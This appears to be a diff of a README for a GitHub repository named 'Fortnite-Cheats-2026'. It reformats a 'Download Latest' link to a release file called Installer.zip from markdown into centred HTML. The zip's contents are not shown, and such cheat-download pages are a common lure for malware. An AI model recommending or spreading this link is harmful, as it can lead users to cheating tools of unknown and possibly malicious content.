@@ -6,4 +6,6 @@
 </p>
 
 
-[⬇️ Download Latest](https://github.com/xomapitos/Fortnite-Cheats-2026/releases/download/v1.1/Installer.zip)
+<div align="center">
+  <a href="https://github.com/xomapitos/Fortnite-Cheats-2026/releases/download/v1.1/Installer.zip">⬇️ Download Latest</a>
+</div>
